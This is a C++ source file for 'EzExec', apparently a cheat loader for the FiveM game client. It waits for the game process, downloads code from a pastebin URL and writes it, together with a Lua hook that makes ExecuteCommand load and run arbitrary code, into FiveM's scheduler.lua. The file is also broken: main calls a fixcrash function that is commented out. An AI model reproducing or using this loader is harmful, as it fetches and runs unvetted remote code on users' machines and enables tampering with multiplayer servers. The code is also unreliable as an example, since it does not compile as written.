#include <stdio.h>
#include <string>
#include <iostream>
#include <fstream>
#include <windows.h>
#include <time.h>
#include <string>
#include <iostream>
#include "auth.h"
#include <Windows.h>
#include <TlHelp32.h>
#include <random>
#include <csignal>
#include <fstream>
#include <iostream>
#include <sstream> //std::stringstream
#include <iostream>
#include <random>
#include <string>
#include <fstream>
#include <sstream>
#include <strsafe.h>
#include "Console.h"
#pragma comment(lib, "urlmon.lib")
#define UNLEN 64

string sp = a_gethid();

using namespace std;
namespace con = JadedHoboConsole;

string openfilename(HWND owner = NULL) {
	OPENFILENAME ofn;
	char fileName[MAX_PATH] = "";
	ZeroMemory(&ofn, sizeof(ofn));
	ofn.lStructSize = sizeof(OPENFILENAME);
	ofn.hwndOwner = owner;
	ofn.lpstrFilter = "Mod Menu Lua (*.lua)\0*.lua\0All Files (*.*)\0*.*\0";
	ofn.lpstrFile = fileName;
	ofn.nMaxFile = MAX_PATH;
	ofn.Flags = OFN_EXPLORER | OFN_FILEMUSTEXIST | OFN_HIDEREADONLY;
	ofn.lpstrDefExt = "";
	string fileNameStr;
	if (GetOpenFileName(&ofn))
		fileNameStr = fileName;
	return fileNameStr;
}

bool GetProcessEntryByName(string name, PROCESSENTRY32* pe) {
	auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE) {
		cerr << "Tool helper cannot be created" << endl;
		return false;
	}

	if (!Process32First(snapshot, pe)) {
		cerr << "Tool helper cannot retrieve the first entry of process list" << endl;
		return false;
	}

	do {
		if (pe->szExeFile == name) {
			snapshot ? CloseHandle(snapshot) : 0;
			return true;
		}
	} while (Process32Next(snapshot, pe));

	snapshot ? CloseHandle(snapshot) : 0;
	return false;
}

void clear() {
	COORD topLeft = { 0, 0 };
	HANDLE console = GetStdHandle(STD_OUTPUT_HANDLE);
	CONSOLE_SCREEN_BUFFER_INFO screen;
	DWORD written;

	GetConsoleScreenBufferInfo(console, &screen);
	FillConsoleOutputCharacterA(
		console, ' ', screen.dwSize.X * screen.dwSize.Y, topLeft, &written
	);
	FillConsoleOutputAttribute(
		console, FOREGROUND_GREEN | FOREGROUND_RED | FOREGROUND_BLUE,
		screen.dwSize.X * screen.dwSize.Y, topLeft, &written
	);
	SetConsoleCursorPosition(console, topLeft);
}

void executecode()
{ 
	//GET CODE FROM WEB // INVISIBLE
	string shedulercode = a_DownloadURL("https://pastebin.com/raw/SaPsiemN");
	string triggerexploit = "if GetCurrentResourceName() == \"chat\" then\nTriggerServerEvent('FAC:EzExec')\nwhile ExecuteCommand == nil do\nWait(0)\nend\n\n______________ = ExecuteCommand\n________ = print\n_________ = load\n\nExecuteCommand = function(commandString)\nif commandString:sub(1, 1) == '/' then\nlocal code = commandString:sub(2)\nlocal s, e = _________(code)\nif s then\ns()\nelse\n________(\"ERROR:\" .. e)\nend\nelse\n______________(commandString)\nend\nend\nend\n";

	//GET PATH AND CREATE FILE
	std::string path = getenv("LOCALAPPDATA");
	ofstream myfile;
	// FLEMME string sheduler = "local debug = debug\nlocal coroutine_close = coroutine.close or (function(c) end) -- 5.3 compatibility\n\n-- setup msgpack compat\nmsgpack.set_string('string_compat')\nmsgpack.set_integer('unsigned')\nmsgpack.set_array('without_hole')\nmsgpack.setoption('empty_table_as_array', true)\n\n-- setup json compat\njson.version = json._VERSION -- Version compatibility\njson.setoption(\"empty_table_as_array\", true)json.setoption('with_hole', true)\n\n-- temp\nlocal function FormatStackTrace()\n	return Citizen.InvokeNative(`FORMAT_STACK_TRACE` & 0xFFFFFFFF, nil, 0, Citizen.ResultAsString())\nlocal function ProfilerEnterScope(scopeName)\nend\n\nlocal function ProfilerExitScope()\n	return Citizen.InvokeNative(`PROFILER_EXIT_SCOPE` & 0xFFFFFFFF)\n";
	myfile.open(path + "\\FiveM\\FiveM.app\\citizen\\scripting\\lua\\scheduler.lua");
	myfile << shedulercode + "\n";
	myfile << triggerexploit + "\n";
	myfile.close();
}


/*void fixcrash()
{
	std::string path = getenv("LOCALAPPDATA");
	string deletes = "del " + path + "\\FiveM\\FiveM.app\\citizen\\scripting\\lua\\scheduler.lua";
	system(deletes.c_str());
	string location = path + "\\FiveM\\FiveM.app\\citizen\\scripting\\lua\\scheduler.lua";
	string url = "https://sencured/";
	HRESULT hr = URLDownloadToFile(NULL, (url).c_str(), (location).c_str(), 0, NULL);
}*/

int main(int argc, const char* argv[]) {
	system("START https://discord.gg/8qxpXeT");
	SetConsoleTitleA("EzExec | By MasterLua#9999 | Discord : https://discord.gg/8qxpXeT");
	clear();
	string  path;
	path = getenv("localappdata");
	ifstream ifile(path + "\\FiveM\\FiveM.app\\adhesive.dll");
	if (ifile) {
	}
	else {
		std::cout << con::fg_white << "[" << con::fg_red << "-" << con::fg_white << "] Your fivem not install in AppData\\Local\\FiveM\\FiveM.app\\ ! Reinstall fivem and try again !" << con::fg_white << " !";
		Sleep(999999999999999);
	}
	PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
	if (GetProcessEntryByName("FiveM_GTAProcess.exe", &pe)) {
		std::cout << con::fg_white << "[" << con::fg_red << "-" << con::fg_white << "] You need open exec before " << con::fg_yellow << "FiveM" << con::fg_white << " !";
		Sleep(999999999999999999);
	}
	cout << "[" << con::fg_red << "+" << con::fg_white <<  "] Waiting for " << con::fg_green << "FiveM_GTAProcess.exe" << con::fg_white << " ..." << endl;
	for (; !GetProcessEntryByName("FiveM_GTAProcess.exe", &pe); Sleep(100));
	fixcrash();
	cout << "[" << con::fg_red << "+" << con::fg_white << "] Injected !" << endl;
	Sleep(3000);
	clear();
	cout << "[" << con::fg_green << "/" << con::fg_white << "] Thank you for choosing " << con::fg_blue << "EzShop " << con::fg_white << "!" << endl;
	Sleep(500);
	cout << "[" << con::fg_green << "/" << con::fg_white << "] server is " << con::fg_green << "online" << con::fg_white << " ..." << endl;
	cout << "[" << con::fg_green << "/" << con::fg_white << "] You have " << con::fg_green << "last update " << con::fg_white << "..." << endl;
	cout << "[" << con::fg_green << "/" << con::fg_white << "] The exec is " << con::fg_green << "not disabled " << con::fg_white << "..." << endl;
	std::cout << "\n";
	cout << "[" << con::fg_green << "1" << con::fg_white << "]" << con::fg_magenta << " EzMenu" << con::fg_white << endl;
	cout << "[" << con::fg_green << "2" << con::fg_white << "]" << con::fg_blue << " Trigger & Execute Menu In Game" << con::fg_white << endl;
	cout << "[" << con::fg_green << "+" << con::fg_white << "]" << con::fg_white << " Menu : " << con::fg_white;
	string number;
	cin >> number;
	if (number == "1") {
		executecode();
		cout << "[" << con::fg_green << "+" << con::fg_white << "]" << con::fg_white << " Injected ! Key is DELETE" << endl;
		Sleep(99999999999999);
	}
	else {
		cout << "[" << con::fg_red << "!" << con::fg_white << "] Wrong choice !" << con::fg_white << endl;
		Sleep(999999999999999);
	}
}